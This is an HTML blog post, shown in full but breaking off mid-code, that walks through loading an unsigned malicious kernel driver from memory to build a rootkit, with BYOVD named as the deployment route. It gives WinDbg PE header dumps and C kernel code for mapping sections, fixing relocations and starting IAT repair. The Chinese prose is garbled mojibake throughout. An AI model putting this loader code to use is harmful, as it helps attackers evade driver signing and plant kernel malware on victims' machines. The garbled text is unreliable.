    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨åšæ¶æ„é©±åŠ¨å¼€å‘çš„æ—¶å€™ï¼Œæƒ³è¦rootkitï¼Œæœ€é‡è¦çš„é—®é¢˜å°±æ˜¯é©±åŠ¨èƒ½ä¸èƒ½åŠ è½½è¿›å»ï¼Œé©±åŠ¨å¼€å‘å¥½äº†ï¼Œæ²¡æœ‰ç­¾åæ— æ³•åŠ è½½ä½¿ç”¨ä¹Ÿæ˜¯æ²¡ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å†…å­˜åŠ è½½é©±åŠ¨è¿™ç§æŠ€æœ¯ï¼ŒæŠŠæœªç­¾åçš„é©±åŠ¨åŠ è½½è¿›å»ï¼Œæˆ‘ä»¬è¿™ç¯‡æ–‡ç« ä½¿ç”¨çš„æ˜¯è‡ªå·±å†™äº†ä¸€ä¸ªé©±åŠ¨ï¼Œç„¶åé©±åŠ¨åšä¸€ä¸ªå†…å­˜åŠ è½½å¦ä¸€ä¸ªé©±åŠ¨ï¼Œå®é™…æƒ…å†µä¸‹ï¼Œä¹Ÿå¯ä½¿ç”¨BYOVDæŠ€æœ¯ï¼Œä½¿ç”¨æœ‰æ¼æ´çš„ç­¾åé©±åŠ¨è¿›è¡Œå†…å­˜åŠ è½½è¡Œä¸ºï¼Œä¸€åˆ‡å°±åˆç†äº†ã€‚</p><h2 id="PEæ–‡ä»¶æ ¼å¼"><a href="#PEæ–‡ä»¶æ ¼å¼" class="headerlink" title="PEæ–‡ä»¶æ ¼å¼"></a>PEæ–‡ä»¶æ ¼å¼</h2><p>PEæ–‡ä»¶è¿™ä¸€å—ä¸»åŒ…ä»åˆšå¼€å§‹å­¦é€†å‘å°±çœ‹è¿™ä¸€å—ï¼Œçœ‹åäº†ã€‚å¤§å®¶è‡ªè¡Œæœç´¢peè¿™ä¸€å—çŸ¥è¯†ï¼Œexe sys dlléƒ½å±äºPEæ–‡ä»¶ã€‚</p><h2 id="ç£ç›˜æ–‡ä»¶è½¬æ¢ä¸ºå†…å­˜æ˜ åƒ"><a href="#ç£ç›˜æ–‡ä»¶è½¬æ¢ä¸ºå†…å­˜æ˜ åƒ" class="headerlink" title="ç£ç›˜æ–‡ä»¶è½¬æ¢ä¸ºå†…å­˜æ˜ åƒ"></a>ç£ç›˜æ–‡ä»¶è½¬æ¢ä¸ºå†…å­˜æ˜ åƒ</h2><p>é¦–å…ˆæˆ‘ä»¬é¢å¯¹çš„æƒ…å†µå°±æ˜¯ä¸€ä¸ªæˆ‘ä»¬å†™å¥½çš„æ¶æ„sysé©±åŠ¨æ–‡ä»¶ï¼Œç›®æ ‡å°±æ˜¯æŠŠè¿™ä¸ªæ–‡ä»¶åŠ è½½è¿›å†…å­˜ï¼Œé‚£ä¹ˆè¦åšçš„å°±æ˜¯ç£ç›˜æ–‡ä»¶è½¬æ¢ä¸ºå†…å­˜æ˜ åƒï¼Œé¦–å…ˆè¦çŸ¥é“peæ–‡ä»¶æ ¼å¼æœ€å¼€å§‹æœ‰ä¸ªDOSå¤´ï¼Œå¤´éƒ¨å‰å‡ ä¸ªå­—èŠ‚å¦‚æœæ˜¯MZå¼€å¤´è¯´æ˜æ˜¯PEæ–‡ä»¶ï¼Œç„¶ååœ¨DOSçš„æœ€åå‡ ä¸ªå­—èŠ‚æ˜¯è·ŸNTå¤´çš„åç§»ï¼ŒNTå¤´é‡Œé¢åˆæœ‰å¾ˆå¤šçš„æ•°æ®ç»“æ„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _IMAGE_DOS_HEADER -r3</span><br><span class="line">ntdll!_IMAGE_DOS_HEADER</span><br><span class="line">   +<span class="number">0x000</span> e_magic          : Uint2B</span><br><span class="line">   +<span class="number">0x002</span> e_cblp           : Uint2B</span><br><span class="line">   +<span class="number">0x004</span> e_cp             : Uint2B</span><br><span class="line">   +<span class="number">0x006</span> e_crlc           : Uint2B</span><br><span class="line">   +<span class="number">0x008</span> e_cparhdr        : Uint2B</span><br><span class="line">   +<span class="number">0x00a</span> e_minalloc       : Uint2B</span><br><span class="line">   +<span class="number">0x00c</span> e_maxalloc       : Uint2B</span><br><span class="line">   +<span class="number">0x00e</span> e_ss             : Uint2B</span><br><span class="line">   +<span class="number">0x010</span> e_sp             : Uint2B</span><br><span class="line">   +<span class="number">0x012</span> e_csum           : Uint2B</span><br><span class="line">   +<span class="number">0x014</span> e_ip             : Uint2B</span><br><span class="line">   +<span class="number">0x016</span> e_cs             : Uint2B</span><br><span class="line">   +<span class="number">0x018</span> e_lfarlc         : Uint2B</span><br><span class="line">   +<span class="number">0x01a</span> e_ovno           : Uint2B</span><br><span class="line">   +<span class="number">0x01c</span> e_res            : [<span class="number">4</span>] Uint2B</span><br><span class="line">   +<span class="number">0x024</span> e_oemid          : Uint2B</span><br><span class="line">   +<span class="number">0x026</span> e_oeminfo        : Uint2B</span><br><span class="line">   +<span class="number">0x028</span> e_res2           : [<span class="number">10</span>] Uint2B</span><br><span class="line">   +<span class="number">0x03c</span> e_lfanew         : Int4B</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; DT _IMAGE_NT_HEADERS -r3</span><br><span class="line">ntdll!_IMAGE_NT_HEADERS</span><br><span class="line">   +<span class="number">0x000</span> Signature        : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> FileHeader       : _IMAGE_FILE_HEADER</span><br><span class="line">      +<span class="number">0x000</span> Machine          : Uint2B</span><br><span class="line">      +<span class="number">0x002</span> NumberOfSections : Uint2B</span><br><span class="line">      +<span class="number">0x004</span> TimeDateStamp    : Uint4B</span><br><span class="line">      +<span class="number">0x008</span> PointerToSymbolTable : Uint4B</span><br><span class="line">      +<span class="number">0x00c</span> NumberOfSymbols  : Uint4B</span><br><span class="line">      +<span class="number">0x010</span> SizeOfOptionalHeader : Uint2B</span><br><span class="line">      +<span class="number">0x012</span> Characteristics  : Uint2B</span><br><span class="line">   +<span class="number">0x018</span> OptionalHeader   : _IMAGE_OPTIONAL_HEADER</span><br><span class="line">      +<span class="number">0x000</span> Magic            : Uint2B</span><br><span class="line">      +<span class="number">0x002</span> MajorLinkerVersion : UChar</span><br><span class="line">      +<span class="number">0x003</span> MinorLinkerVersion : UChar</span><br><span class="line">      +<span class="number">0x004</span> SizeOfCode       : Uint4B</span><br><span class="line">      +<span class="number">0x008</span> SizeOfInitializedData : Uint4B</span><br><span class="line">      +<span class="number">0x00c</span> SizeOfUninitializedData : Uint4B</span><br><span class="line">      +<span class="number">0x010</span> AddressOfEntryPoint : Uint4B</span><br><span class="line">      +<span class="number">0x014</span> BaseOfCode       : Uint4B</span><br><span class="line">      +<span class="number">0x018</span> BaseOfData       : Uint4B</span><br><span class="line">      +<span class="number">0x01c</span> ImageBase        : Uint4B</span><br><span class="line">      +<span class="number">0x020</span> SectionAlignment : Uint4B</span><br><span class="line">      +<span class="number">0x024</span> FileAlignment    : Uint4B</span><br><span class="line">      +<span class="number">0x028</span> MajorOperatingSystemVersion : Uint2B</span><br><span class="line">      +<span class="number">0x02a</span> MinorOperatingSystemVersion : Uint2B</span><br><span class="line">      +<span class="number">0x02c</span> MajorImageVersion : Uint2B</span><br><span class="line">      +<span class="number">0x02e</span> MinorImageVersion : Uint2B</span><br><span class="line">      +<span class="number">0x030</span> MajorSubsystemVersion : Uint2B</span><br><span class="line">      +<span class="number">0x032</span> MinorSubsystemVersion : Uint2B</span><br><span class="line">      +<span class="number">0x034</span> Win32VersionValue : Uint4B</span><br><span class="line">      +<span class="number">0x038</span> SizeOfImage      : Uint4B</span><br><span class="line">      +<span class="number">0x03c</span> SizeOfHeaders    : Uint4B</span><br><span class="line">      +<span class="number">0x040</span> CheckSum         : Uint4B</span><br><span class="line">      +<span class="number">0x044</span> Subsystem        : Uint2B</span><br><span class="line">      +<span class="number">0x046</span> DllCharacteristics : Uint2B</span><br><span class="line">      +<span class="number">0x048</span> SizeOfStackReserve : Uint4B</span><br><span class="line">      +<span class="number">0x04c</span> SizeOfStackCommit : Uint4B</span><br><span class="line">      +<span class="number">0x050</span> SizeOfHeapReserve : Uint4B</span><br><span class="line">      +<span class="number">0x054</span> SizeOfHeapCommit : Uint4B</span><br><span class="line">      +<span class="number">0x058</span> LoaderFlags      : Uint4B</span><br><span class="line">      +<span class="number">0x05c</span> NumberOfRvaAndSizes : Uint4B</span><br><span class="line">      +<span class="number">0x060</span> DataDirectory    : [<span class="number">16</span>] _IMAGE_DATA_DIRECTORY</span><br><span class="line">         +<span class="number">0x000</span> VirtualAddress   : Uint4B</span><br><span class="line">         +<span class="number">0x004</span> Size             : Uint4B</span><br></pre></td></tr></table></figure><p>æ•°æ®ç»“æ„å¦‚ä¸Šï¼Œå¯ä»¥ä¸‹è½½ä¸€äº›ç¼–è¯‘å™¨æ¥æŸ¥çœ‹ï¼Œæˆ–è€…å»vsé‡Œé¢è°ƒç”¨ä¸€äº›æ¥å£å¯ä»¥ç›´æ¥çœ‹æ•°æ®ç»“æ„ã€‚è¦åšçš„å°±æ˜¯æŠŠæ–‡ä»¶é‡Œé¢è¿™äº›ä¸œè¥¿ç›´æ¥æ”¾åˆ°å†…å­˜è¿›è¡ŒæŒ‰å†…å­˜å¯¹é½è§„åˆ™å¤åˆ¶æ•°æ®å³å¯ï¼Œä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å…ˆè§£æPEæ–‡ä»¶è·å–image(æ‹‰ä¼¸)</span></span><br><span class="line">PUCHAR <span class="title function_">FileToImange</span><span class="params">(<span class="type">char</span>* FileBuffer)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!FileBuffer) <span class="keyword">return</span> FALSE;</span><br><span class="line"><span class="comment">//è·å–doså¤´</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)FileBuffer;</span><br><span class="line"><span class="comment">//è·å–NTå¤´</span></span><br><span class="line"><span class="comment">//NTå¤´ = æ–‡ä»¶çš„èµ·å§‹ä½ç½® + doså¤´çš„e_lfanew</span></span><br><span class="line"><span class="comment">//NTå¤´ä¹Ÿå¯ä»¥é€šè¿‡`RtlImageNtHeader`è·å¾—ï¼Œä¸è¿‡è¿™ä¸ªå‡½æ•°æ²¡æœ‰æ–‡æ¡£åŒ–ï¼Œéœ€è¦æå‰å£°æ˜PIMAGE_NT_HEADERS* RtlImageNtHeader(void* Base)</span></span><br><span class="line">PIMAGE_NT_HEADERS pNts = (PIMAGE_NT_HEADERS)(FileBuffer + pDos-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">åˆ›å»ºImageBuffer</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//è·å–PEæ–‡ä»¶çš„Imageå¤§å°</span></span><br><span class="line">ULONG SizeOfImage = pNts-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line"><span class="comment">//ç”³è¯·ä¸€å—å†…å­˜</span></span><br><span class="line"><span class="comment">//ä½¿ç”¨éåˆ†é¡µå†…å­˜æ¥ä¿è¯å¯æ‰§è¡Œï¼Œä½¿ç”¨PEçš„Imageå¤§å°ä½œä¸ºç”³è¯·çš„å¤§å°</span></span><br><span class="line">PUCHAR ImageBuffer = ExAllocatePool(NonPagedPool, SizeOfImage);</span><br><span class="line"><span class="comment">//å°†ç”³è¯·çš„å†…å­˜æ¸…ç©º</span></span><br><span class="line"><span class="built_in">memset</span>(ImageBuffer, <span class="number">0</span>, SizeOfImage);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//å¤åˆ¶PEå¤´,å°†peæ–‡ä»¶å¤åˆ¶åˆ°ImageBufferï¼ŒæŒ‰ç…§æ‰€æœ‰å¤´éƒ¨æ€»å’Œçš„å¤§å°å¤åˆ¶</span></span><br><span class="line"><span class="built_in">memcpy</span>(ImageBuffer, FileBuffer, pNts-&gt;OptionalHeader.SizeOfHeaders);</span><br><span class="line"><span class="comment">//è·å–PEæ–‡ä»¶çš„èŠ‚åŒºæ•°é‡</span></span><br><span class="line">ULONG NumberOfSections = pNts-&gt;FileHeader.NumberOfSections;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å¾—ç¬¬ä¸€ä¸ªèŠ‚åŒº</span></span><br><span class="line">PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNts);</span><br><span class="line"><span class="comment">//å¤åˆ¶èŠ‚åŒº</span></span><br><span class="line"><span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//å°†æ–‡ä»¶çš„PEå¤´å¤åˆ¶åˆ°imageä¸­</span></span><br><span class="line"><span class="built_in">memcpy</span>(ImageBuffer + pSection-&gt;VirtualAddress, FileBuffer + pSection-&gt;PointerToRawData, pSection-&gt;SizeOfRawData);</span><br><span class="line"><span class="comment">//è·å–ä¸‹ä¸€ä¸ªpSection</span></span><br><span class="line">pSection++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å°†å­˜å‚¨æ‹‰ä¼¸åçš„PEå¤´çš„ImageBufferè¿”å›</span></span><br><span class="line"><span class="keyword">return</span> ImageBuffer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ä¿®å¤é‡å®šä½"><a href="#ä¿®å¤é‡å®šä½" class="headerlink" title="ä¿®å¤é‡å®šä½"></a>ä¿®å¤é‡å®šä½</h2><h3 id="ä»€ä¹ˆæ˜¯é‡å®šä½ï¼ˆRelocationï¼‰ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯é‡å®šä½ï¼ˆRelocationï¼‰ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯é‡å®šä½ï¼ˆRelocationï¼‰ï¼Ÿ"></a><strong>ä»€ä¹ˆæ˜¯é‡å®šä½ï¼ˆRelocationï¼‰ï¼Ÿ</strong></h3><ul><li><strong>èƒŒæ™¯</strong>ï¼šPEæ–‡ä»¶ç¼–è¯‘æ—¶ä¼šå‡è®¾è‡ªå·±åŠ è½½åˆ°æŸä¸ªå›ºå®šåŸºå€ï¼ˆå¦‚<code>0x400000</code>ï¼‰ã€‚è‹¥è¯¥åœ°å€è¢«å ç”¨ï¼Œç³»ç»Ÿä¼šå°†å…¶åŠ è½½åˆ°å…¶ä»–åœ°å€ï¼ˆå¦‚<code>0x500000</code>ï¼‰ã€‚</li><li><strong>é—®é¢˜</strong>ï¼šä»£ç ä¸­æ‰€æœ‰ç¡¬ç¼–ç çš„ç»å¯¹åœ°å€ï¼ˆå¦‚<code>call 0x401000</code>ï¼‰ä¼šå¤±æ•ˆã€‚</li><li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šPEæ–‡ä»¶åŒ…å« <strong>é‡å®šä½è¡¨</strong>ï¼ˆ<code>.reloc</code>èŠ‚ï¼‰ï¼Œè®°å½•æ‰€æœ‰éœ€è¦è°ƒæ•´çš„ç»å¯¹åœ°å€ä½ç½®ã€‚</li></ul><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830005848347.png" alt="image-20250830005848347"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¿®å¤é‡å®šä½,ä¼ å…¥æ‹‰ä¼¸åçš„ImageBuffer</span></span><br><span class="line">BOOLEAN <span class="title function_">UpdataRelocation</span><span class="params">(<span class="type">char</span>* ImageBuffer)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!ImageBuffer) <span class="keyword">return</span> FALSE;</span><br><span class="line"><span class="comment">//è·å–PEçš„NTå¤´ï¼Œè¿™é‡Œä½¿ç”¨æœªæ–‡æ¡£åŒ–çš„å‡½æ•°è¿›è¡Œè·å–</span></span><br><span class="line">PIMAGE_NT_HEADERS pNts = RtlImageNtHeader(ImageBuffer);</span><br><span class="line"><span class="comment">//å¦‚æœæ²¡æœ‰è·å–åˆ°ï¼Œè¿”å›FALSE</span></span><br><span class="line"><span class="keyword">if</span> (!pNts) <span class="keyword">return</span> FALSE;</span><br><span class="line"><span class="comment">//å–ç›®å½•è¡¨ï¼Œç›®å½•è¡¨æ˜¯ç¬¬äº”ä¸ª,ä¹Ÿå°±æ˜¯IMAGE_DIRECTORY_ENTRY_BASERELOC</span></span><br><span class="line"><span class="comment">//å› ä¸ºæ˜¯`PIMAGE_DATA_DIRECTORY`æ˜¯ä¸ªæŒ‡é’ˆï¼Œæ‰€ä»¥åé¢çš„pNtsè¦å–åœ°å€</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY iReplocation = &amp;pNts-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];</span><br><span class="line"><span class="comment">//å–é‡å®šä½ä¿¡æ¯çš„ä½ç½®ï¼ŒImageBuffer + RVA(åç§»)</span></span><br><span class="line">PIMAGE_BASE_RELOCATION pBase = (PIMAGE_BASE_RELOCATION)(ImageBuffer + iReplocation-&gt;VirtualAddress);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å½“è¿™ä¸¤ä¸ªéƒ½å­˜åœ¨çš„æ—¶å€™å°±è¯æ˜è¿˜å­˜åœ¨éœ€è¦ä¿®å¤çš„é‡å®šå‘</span></span><br><span class="line"><span class="comment">//å½“å—çš„å¤§å°å’Œè™šæ‹Ÿåœ°å€éƒ½æ˜¯ç©ºçš„é€€å‡º</span></span><br><span class="line"><span class="keyword">while</span> (pBase-&gt;SizeOfBlock &amp;&amp; pBase-&gt;VirtualAddress)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æŒ‡å‘å—çš„ä½ç½®</span></span><br><span class="line"><span class="comment">//PIMAGE_RELOC RelocationBlock = (PIMAGE_RELOC)(pBase-&gt;VirtualAddress + ImageBuffer + sizeof(IMAGE_BASE_RELOCATION));</span></span><br><span class="line">PIMAGE_RELOC RelocationBlock = (PIMAGE_RELOC)((PUCHAR)pBase + <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION));</span><br><span class="line"><span class="comment">//è®¡ç®—éœ€è¦ä¿®å¤çš„é‡å®šå‘çš„æ•°ç›®</span></span><br><span class="line">UINT32 NumberOfRelocation = (pBase-&gt;SizeOfBlock - <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="keyword">sizeof</span>(IMAGE_RELOC);</span><br><span class="line"><span class="comment">//éå†æ¯ä¸€ä¸ªèŠ‚åŒº</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NumberOfRelocation; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (RelocationBlock[i].Type == IMAGE_REL_BASED_DIR64)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//64ä½</span></span><br><span class="line">PUINT64 Address = (PUINT64)((PUINT8)ImageBuffer + pBase-&gt;VirtualAddress + RelocationBlock[i].Offset);</span><br><span class="line">UINT64 Delta = *Address - pNts-&gt;OptionalHeader.ImageBase + (PUINT8)ImageBuffer;</span><br><span class="line">*Address = Delta;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (RelocationBlock[i].Type == IMAGE_REL_BASED_HIGHLOW)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//32ä½</span></span><br><span class="line">PUINT32 Address = (PUINT32)((PUINT8)ImageBuffer + pBase-&gt;VirtualAddress + (RelocationBlock[i].Offset));</span><br><span class="line">UINT32 Delta = *Address - pNts-&gt;OptionalHeader.ImageBase + (PUINT8)ImageBuffer;</span><br><span class="line">*Address = Delta;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å¾ªç¯å®Œä¸€æ¬¡å°±åˆ°ä¸‹ä¸€ä¸ªæ¨¡å—</span></span><br><span class="line">pBase = (PIMAGE_BASE_RELOCATION)((PUCHAR)pBase + pBase-&gt;SizeOfBlock);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ä¿®å¤IAT"><a href="#ä¿®å¤IAT" class="headerlink" title="ä¿®å¤IAT"></a>ä¿®å¤IAT</h2><p>ä¿®å¤IATéœ€è¦åˆ†æˆ3æ­¥</p><ol><li>è¦æœ‰ä¸€ä¸ªéå†æ¨¡å—ï¼Œæ ¹æ®IATè¡¨ä¸­çš„å‡½æ•°åæŸ¥è¯¢å…¶æ¨¡å—åŸºåœ°å€</li><li>æ ¹æ®å‡½æ•°åå­—æ‰¾åˆ°å…¶å¯¹åº”æ¨¡å—ä¸­å¯¹åº”çš„å‡½æ•°åœ°å€</li><li>ä¿®å¤IAT</li></ol><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830015757002.png" alt="image-20250830015757002"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸€ä¸ªé©±åŠ¨ç¨‹åºæ‰€éœ€è¦çš„åªæœ‰è¿™ä¸€ä¸ªç¨‹åºé‡Œé¢çš„å¯¼å‡ºå‡½æ•°</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830020511040.png" alt="image-20250830020511040"></p><p>æ‰€ä»¥æˆ‘ä»¬è¦ä¿®å¤å¯¼å…¥è¡¨å°±è¦è·å–è¿™ä¸ªçš„åŸºåœ°å€ï¼Œç„¶åè·å–ä»–é‡Œé¢çš„å¯¼å‡ºè¡¨ï¼Œå¯¼å…¥è¡¨ä¸è¿™ä¸ªçš„å¯¼å‡ºè¡¨è¿›è¡Œå¯¹åº”ï¼Œæ‰¾åˆ°äº†ç›´æ¥åç§»åŠ åŸºåœ°å€å³å¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tools.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ ¹æ®æä¾›çš„æ¨¡å—åï¼Œéå†å†…æ ¸æ¨¡å—ï¼Œè¿”å›æ¨¡å—åŸºå€</span></span><br><span class="line"><span class="comment">//è¿™ä¸ªè¿”å›å€¼ï¼ˆULONG_PTRï¼‰æœ‰ä¸ªå¥½å¤„ï¼Œå°±æ˜¯å½“ç¼–è¯‘ä¸º32ä½çš„æ—¶å€™ä»–æ˜¯32ï¼Œ64ä½æ˜¯64</span></span><br><span class="line"><span 